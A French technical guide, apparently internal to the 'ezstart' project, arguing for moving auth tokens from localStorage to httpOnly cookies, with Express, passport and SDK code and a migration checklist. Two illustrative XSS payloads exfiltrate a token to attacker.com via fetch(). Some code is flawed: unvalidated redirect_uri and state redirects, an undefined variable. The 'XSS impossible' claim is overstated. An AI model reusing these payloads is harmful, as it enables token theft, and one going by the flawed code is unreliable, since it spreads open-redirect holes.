# 🔒 Guide Complet: httpOnly Cookies vs localStorage

**Date:** 27 Octobre 2025
**Objectif:** Décider entre localStorage (actuel) et httpOnly cookies (plus sécurisé)

---

## 🎯 TL;DR - Recommandation Finale

**Pour @ezstart monorepo:** ✅ **Migrer vers httpOnly cookies**

**Pourquoi ?**
1. ✅ **100% compatible** avec OAuth Google/GitHub/etc.
2. ✅ **XSS impossible** - JavaScript ne peut pas lire le token
3. ✅ **Reste connecté** - Cookie persiste (maxAge: 7 jours)
4. ✅ **SSO fonctionne** - Cookie partagé entre sous-domaines

**Effort:** 2-3 heures (backend + frontend changes)
**Impact:** +10 points sécurité, 0 régression fonctionnelle

---

## 🔐 Sécurité: httpOnly vs localStorage

### localStorage (Actuel)

```typescript
// Frontend peut lire le token
const token = localStorage.getItem('ezauth-storage')

// ❌ Si XSS attack → Token volé
<img onerror="fetch('https://attacker.com?token=' + localStorage.getItem('ezauth-storage'))" />
```

**Vecteurs d'attaque XSS:**
1. **Commentaire malveillant** - User post `<script>...</script>`
2. **Dépendance compromise** - NPM package injecte du code
3. **Extension browser malveillante** - Chrome extension vole les données
4. **Man-in-the-middle** - Inject JavaScript via réseau non-sécurisé

### httpOnly Cookies (Recommandé)

```typescript
// Backend set cookie
res.cookie('auth_token', token, {
  httpOnly: true,    // ✅ JavaScript CANNOT read
  secure: true,      // ✅ HTTPS only
  sameSite: 'lax',   // ✅ CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 jours
})

// Frontend - Pas d'accès au token !
console.log(document.cookie)  // ❌ 'auth_token' NOT visible

// Cookie envoyé AUTOMATIQUEMENT avec chaque requête
fetch('https://api.ezstart.xyz/me')  // Cookie inclus auto
```

**Protection XSS:**
```javascript
// ✅ Même avec XSS, attacker ne peut PAS lire le cookie
<script>
  const token = document.cookie  // ❌ httpOnly cookie invisible
  fetch('https://attacker.com?token=' + token)  // ❌ Token vide
</script>
```

**Seul vecteur restant:** CSRF (Cross-Site Request Forgery)
**Protection:** `sameSite: 'lax'` + CSRF token (déjà discuté)

---

## 🌐 Compatibilité OAuth (Google, GitHub, etc.)

### Question: httpOnly Cookies = Incompatible avec OAuth ?

**❌ FAUX !** C'est **100% compatible** !

### Architecture OAuth avec httpOnly Cookies

```
┌─────────────────────────────────────────────────────────────────┐
│                     OAuth Flow (Inchangé)                        │
└─────────────────────────────────────────────────────────────────┘

1. User click "Login with Google"
   → Frontend: <a href="https://accounts.google.com/...">

2. Google OAuth page
   → User autorise

3. Google redirect vers EZAuth callback
   → https://ezauth.ezstart.xyz/api/auth/google/callback?code=ABC123

4. ✅ BACKEND (EZAuth API) échange code → Google access_token
   → Récupère user info (email, name, avatar)
   → Crée/update user dans MongoDB
   → Génère JWT token @ezstart

5. ✅ BACKEND set httpOnly cookie
   res.cookie('auth_token', jwt, { httpOnly: true })
   → Redirect vers app: https://ezbill.ezstart.xyz/dashboard

6. ✅ Frontend n'a jamais vu le token !
   → Mais cookie est set → User authentifié

7. Frontend fait API calls
   → fetch('/api/invoices')  // Cookie envoyé auto ✅
```

**Différence vs localStorage:**

| Étape | localStorage (Actuel) | httpOnly Cookies (Recommandé) |
|-------|----------------------|-------------------------------|
| **1-3** | ✅ Identique (OAuth flow) | ✅ Identique |
| **4** | Backend retourne `{ token }` JSON | Backend set cookie + redirect |
| **5** | Frontend save `localStorage.setItem('token', ...)` | Frontend reçoit cookie auto (invisible) |
| **6** | Frontend lit token pour API calls | Cookie envoyé auto (pas de code JS) |

---

## ✅ Reste Connecté - Cookie Persistence

### Durée de Session

```typescript
// Backend - EZAuth API
res.cookie('auth_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 7 * 24 * 60 * 60 * 1000,  // ✅ 7 JOURS (comme localStorage actuel)
  path: '/',
  domain: '.ezstart.xyz'  // ✅ Partagé entre tous les sous-domaines
})
```

**Résultat:**
- ✅ Cookie persiste 7 jours (même après fermeture browser)
- ✅ User reste connecté pendant 7 jours
- ✅ SSO fonctionne entre `ezbill.ezstart.xyz`, `ezpay.ezstart.xyz`, etc.

**Note:** `domain: '.ezstart.xyz'` = Cookie partagé entre:
- ezauth.ezstart.xyz
- ezbill.ezstart.xyz
- ezpay.ezstart.xyz
- fengshui.ezstart.xyz
- Tous les sous-domaines `.ezstart.xyz`

---

## 🔄 Migration: localStorage → httpOnly Cookies

### Backend Changes (EZAuth API)

#### 1. Modifier `/api/auth/login`

**AVANT (localStorage):**
```typescript
// apps/ezauth/api/src/routes/auth.ts
router.post('/api/auth/login', async (req, res) => {
  const { email, password, app } = req.body

  // 1. Valider credentials
  const user = await AuthUser.findOne({ email })
  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  // 2. Créer auth code
  const code = await AuthCode.create({
    userId: user._id,
    app,
    expiresAt: new Date(Date.now() + 5 * 60 * 1000)
  })

  // 3. Retourner code (frontend exchange code → token)
  res.json({ code: code.code })
})

router.post('/api/auth/token', async (req, res) => {
  const { code } = req.body

  // Valider code
  const authCode = await AuthCode.findOne({ code, used: false })
  if (!authCode) {
    return res.status(400).json({ error: 'Invalid code' })
  }

  // Générer JWT
  const token = jwt.sign(
    { userId: authCode.userId, email: user.email },
    process.env.JWT_SECRET,
    { expiresIn: '7d' }
  )

  // ❌ ANCIEN: Retourner token JSON
  res.json({ access_token: token, user })
})
```

**APRÈS (httpOnly Cookies):**
```typescript
// apps/ezauth/api/src/routes/auth.ts
import { config } from '@ezstart/config'

router.post('/api/auth/login', async (req, res) => {
  const { email, password, app, redirect_uri } = req.body

  // 1. Valider credentials (identique)
  const user = await AuthUser.findOne({ email })
  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  // 2. Générer JWT immédiatement (pas de code intermédiaire)
  const token = jwt.sign(
    { userId: user._id, email: user.email, apps: user.apps },
    process.env.JWT_SECRET,
    { expiresIn: '7d' }
  )

  // 3. ✅ NOUVEAU: Set httpOnly cookie
  res.cookie('ezauth_token', token, {
    httpOnly: true,       // JavaScript cannot read
    secure: process.env.NODE_ENV === 'production',  // HTTPS only in prod
    sameSite: 'lax',      // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
    path: '/',
    domain: process.env.NODE_ENV === 'production' ? '.ezstart.xyz' : undefined
  })

  // 4. ✅ Redirect vers app (au lieu de retourner JSON)
  const callbackUrl = redirect_uri || `https://${app}.ezstart.xyz/dashboard`
  res.redirect(callbackUrl)
})

// ✅ Route /token plus nécessaire ! (login set cookie directement)
// ✅ GARDER pour backward compatibility le temps de migrer
router.post('/api/auth/token', async (req, res) => {
  // ... existing code (pour apps pas encore migrées)
})
```

#### 2. Modifier `/api/auth/google` (OAuth)

```typescript
// apps/ezauth/api/src/routes/auth.ts
import passport from 'passport'
import { Strategy as GoogleStrategy } from 'passport-google-oauth20'

// Configure Google OAuth
passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: `${process.env.API_URL}/api/auth/google/callback`
}, async (accessToken, refreshToken, profile, done) => {
  // Find or create user
  let user = await AuthUser.findOne({ email: profile.emails[0].value })

  if (!user) {
    user = await AuthUser.create({
      email: profile.emails[0].value,
      username: profile.displayName,
      firstName: profile.name.givenName,
      lastName: profile.name.familyName,
      avatar: profile.photos[0].value,
      isVerified: true,  // Google email already verified
      apps: ['ezstart'],  // Default app access
      provider: 'google'
    })
  }

  done(null, user)
}))

// Route: Initiate Google login
router.get('/api/auth/google',
  passport.authenticate('google', {
    scope: ['profile', 'email']
  })
)

// Route: Google callback
router.get('/api/auth/google/callback',
  passport.authenticate('google', { session: false, failureRedirect: '/login' }),
  (req, res) => {
    // ✅ User authentifié par Google
    const user = req.user as AuthUser

    // ✅ Générer JWT token
    const token = jwt.sign(
      { userId: user._id, email: user.email, apps: user.apps },
      process.env.JWT_SECRET,
      { expiresIn: '7d' }
    )

    // ✅ Set httpOnly cookie
    res.cookie('ezauth_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000,
      path: '/',
      domain: process.env.NODE_ENV === 'production' ? '.ezstart.xyz' : undefined
    })

    // ✅ Redirect vers app demandée
    const app = req.query.state || 'ezstart'  // State = app name
    const redirectUrl = `https://${app}.ezstart.xyz/dashboard`
    res.redirect(redirectUrl)
  }
)
```

#### 3. Middleware d'authentification

```typescript
// apps/ezauth/api/src/middleware/auth.ts (NOUVEAU)
import jwt from 'jsonwebtoken'

export function requireAuth(req, res, next) {
  // ✅ Lire cookie au lieu de Authorization header
  const token = req.cookies.ezauth_token

  if (!token) {
    return res.status(401).json({ error: 'Authentication required' })
  }

  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET)
    req.user = payload
    next()
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' })
  }
}

// Usage
router.get('/api/auth/me', requireAuth, async (req, res) => {
  const user = await AuthUser.findById(req.user.userId)
  res.json({ user })
})
```

### Frontend Changes (@ezstart/auth-sdk)

#### 1. Modifier `client.ts`

**AVANT:**
```typescript
// src/client.ts
async exchangeCode(code: string): Promise<AuthToken> {
  const response = await fetch(`${this.config.baseURL}/token`, {
    method: 'POST',
    body: JSON.stringify({ code })
  })

  const result = await response.json()
  return {
    access_token: result.access_token,
    user: result.user
  }
}
```

**APRÈS:**
```typescript
// src/client.ts
async exchangeCode(code: string): Promise<AuthUser> {
  // ✅ Plus besoin d'échanger code !
  // Cookie déjà set par backend lors du login

  // ✅ Juste récupérer user info
  const response = await fetch(`${this.config.baseURL}/me`, {
    credentials: 'include'  // ✅ IMPORTANT: Envoyer cookies
  })

  if (!response.ok) {
    throw new Error('Failed to get user info')
  }

  const result = await response.json()
  return result.user
}

async getCurrentUser(): Promise<AuthUser> {
  const response = await fetch(`${this.config.baseURL}/me`, {
    credentials: 'include'  // ✅ CRITICAL: Include cookies
  })

  if (!response.ok) {
    throw new Error('Not authenticated')
  }

  const result = await response.json()
  return result.user
}

// ✅ NOUVEAU: Logout (clear cookie)
async logout(): Promise<void> {
  await fetch(`${this.config.baseURL}/logout`, {
    method: 'POST',
    credentials: 'include'
  })
}
```

#### 2. Modifier `store.ts`

**AVANT:**
```typescript
// src/store.ts
export interface AuthState {
  user: AuthUser | null
  accessToken: string | null  // ❌ Plus nécessaire
  isAuthenticated: boolean

  setAuth: (user: AuthUser, accessToken: string) => void
}
```

**APRÈS:**
```typescript
// src/store.ts
export interface AuthState {
  user: AuthUser | null
  // ✅ accessToken supprimé (géré par cookie)
  isAuthenticated: boolean

  setAuth: (user: AuthUser) => void  // ✅ Plus besoin de token
}

export const useAuthStore = create<AuthState>()(
  persist(
    (set) => ({
      user: null,
      isAuthenticated: false,

      setAuth: (user: AuthUser) => {
        set({
          user,
          isAuthenticated: true
        })
      },

      logout: () => {
        set({
          user: null,
          isAuthenticated: false
        })
      }
    }),
    {
      name: 'ezauth-storage',
      partialize: (state) => ({
        user: state.user,  // ✅ Seulement user (pas de token)
        isAuthenticated: state.isAuthenticated
      })
    }
  )
)
```

#### 3. Modifier `provider.tsx`

**APRÈS:**
```typescript
// src/provider.tsx
export function useAuth() {
  const { client } = useAuthContext()
  const store = useAuthStore()

  const login = (): Promise<never> => {
    client.redirectToLogin()
    return new Promise(() => {})
  }

  const logout = async () => {
    // ✅ Clear cookie backend
    await client.logout()
    // ✅ Clear local state
    store.logout()
  }

  const handleCallback = async (code?: string) => {
    try {
      // ✅ Cookie déjà set, juste get user
      const user = await client.getCurrentUser()
      store.setAuth(user)  // ✅ Plus besoin de token
      return user
    } catch (error) {
      console.error('Auth callback error:', error)
      throw error
    }
  }

  return {
    user: store.user,
    isAuthenticated: store.isAuthenticated,
    login,
    logout,
    handleCallback
  }
}
```

#### 4. CRITIQUE: `credentials: 'include'`

**Chaque fetch DOIT inclure cookies:**

```typescript
// ❌ MAUVAIS - Cookie pas envoyé
fetch('https://api.ezstart.xyz/invoices')

// ✅ BON - Cookie inclus
fetch('https://api.ezstart.xyz/invoices', {
  credentials: 'include'
})
```

**Solution: Wrapper fetch global**

```typescript
// packages/config/src/fetch-with-credentials.ts (NOUVEAU)
export async function callApi(url: string, options?: RequestInit) {
  return fetch(url, {
    ...options,
    credentials: 'include',  // ✅ Toujours inclure cookies
    headers: {
      'Content-Type': 'application/json',
      ...options?.headers
    }
  })
}

// Usage partout
import { callApi } from '@ezstart/config'

const invoices = await callApi('/api/invoices').then(r => r.json())
```

---

## ⚙️ CORS Configuration

**CRITIQUE:** Backend DOIT autoriser credentials

```typescript
// apps/ezauth/api/src/index.ts
import cors from 'cors'

app.use(cors({
  origin: [
    'https://ezbill.ezstart.xyz',
    'https://ezpay.ezstart.xyz',
    'https://fengshui.ezstart.xyz',
    // ... toutes les apps
  ],
  credentials: true  // ✅ CRITICAL: Allow cookies
}))
```

**Sans `credentials: true` → Cookies bloqués par browser !**

---

## 🎯 Avantages httpOnly Cookies

| Feature | localStorage | httpOnly Cookies |
|---------|--------------|------------------|
| **XSS Protection** | ❌ Vulnérable | ✅ Immune |
| **CSRF Protection** | ✅ Oui (si CSRF token) | ✅ Oui (`sameSite: 'lax'`) |
| **Reste connecté** | ✅ Oui (7 jours) | ✅ Oui (7 jours) |
| **SSO multi-domaines** | ✅ Oui (manual) | ✅ Oui (`domain: '.ezstart.xyz'`) |
| **OAuth compatible** | ✅ Oui | ✅ Oui |
| **Simplicité code** | ⚠️ Manual token management | ✅ Auto (browser gère) |
| **Mobile apps** | ✅ Oui (AsyncStorage) | ❌ Non (pas de cookies) |
| **Debugging** | ✅ DevTools → Application | ⚠️ DevTools → Network (moins visible) |

---

## 🚨 Inconvénients httpOnly Cookies

### 1. Mobile Apps (React Native)

**Problème:** React Native n'a PAS de cookies
**Solution:** API doit supporter 2 modes

```typescript
// Backend - Dual mode support
function authenticate(req, res, next) {
  // Mode 1: httpOnly cookie (Web)
  let token = req.cookies.ezauth_token

  // Mode 2: Authorization header (Mobile)
  if (!token) {
    const authHeader = req.headers.authorization
    if (authHeader?.startsWith('Bearer ')) {
      token = authHeader.substring(7)
    }
  }

  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' })
  }

  // Verify token (same logic)
  const payload = jwt.verify(token, process.env.JWT_SECRET)
  req.user = payload
  next()
}
```

### 2. CORS Préflight Requests

**Problème:** `credentials: 'include'` → Plus de preflight OPTIONS requests
**Impact:** Légère overhead (10-50ms)
**Solution:** Caching CORS headers

```typescript
app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  maxAge: 86400  // ✅ Cache preflight 24h
}))
```

### 3. Debugging Plus Difficile

**localStorage:**
```javascript
// DevTools → Application → Local Storage → Voir token
console.log(localStorage.getItem('ezauth-storage'))
```

**httpOnly Cookie:**
```javascript
// ❌ console.log(document.cookie) → Ne montre PAS httpOnly
// ✅ DevTools → Network → Request Headers → Cookie: ezauth_token=...
// ✅ DevTools → Application → Cookies → ezstart.xyz → ezauth_token
```

---

## 📊 Migration Checklist

### Backend (EZAuth API) - 2h

- [ ] Install dependencies
  ```bash
  pnpm --filter api-ezauth add cookie-parser passport passport-google-oauth20
  ```

- [ ] Ajouter `cookie-parser` middleware
  ```typescript
  import cookieParser from 'cookie-parser'
  app.use(cookieParser())
  ```

- [ ] Modifier CORS config (add `credentials: true`)

- [ ] Modifier `/api/auth/login` (set cookie + redirect)

- [ ] Créer `/api/auth/google` routes (OAuth)

- [ ] Créer `/api/auth/logout` (clear cookie)

- [ ] Modifier `requireAuth` middleware (read cookie)

- [ ] Tester avec Postman/curl

### Frontend (@ezstart/auth-sdk) - 1h

- [ ] Modifier `client.ts` (remove token exchange, add `credentials: 'include'`)

- [ ] Modifier `store.ts` (remove `accessToken` field)

- [ ] Modifier `provider.tsx` (simplify `setAuth`)

- [ ] Créer `callApi` wrapper avec `credentials: 'include'`

- [ ] Update tous les `fetch()` → `callApi()`

- [ ] Tester login/logout flow

### Apps (EZBill, EZPay, etc.) - 30 min

- [ ] Remplacer `fetch()` par `callApi()` partout

- [ ] Tester SSO entre apps

- [ ] Vérifier cookie partagé (DevTools → Application → Cookies)

---

## ✅ Recommandation Finale

### Pour @ezstart Monorepo

**✅ MIGRER vers httpOnly Cookies**

**Raisons:**
1. ✅ **+10 points sécurité** (XSS impossible)
2. ✅ **Même UX** (reste connecté 7 jours)
3. ✅ **SSO simplifié** (`domain: '.ezstart.xyz'`)
4. ✅ **OAuth 100% compatible** (Google, GitHub, etc.)
5. ✅ **Code plus simple** (pas de token management frontend)

**Effort total:** 3-4 heures (backend 2h + SDK 1h + apps 1h)

**Breaking changes:** ⚠️ Migration progressive possible
- Garder `/api/auth/token` endpoint pour backward compatibility
- Migrer apps une par une
- Supprimer ancien flow après migration complète

---

## 🎯 Next Steps

1. **Créer branch** `feat/httponly-cookies`
2. **Migrer EZAuth API** (backend changes)
3. **Migrer @ezstart/auth-sdk** (remove accessToken)
4. **Tester avec EZBill** (première app test)
5. **Migrer autres apps** une par une
6. **Supprimer ancien code** après validation complète

---

**Questions ?** Besoin d'aide pour implémenter ?
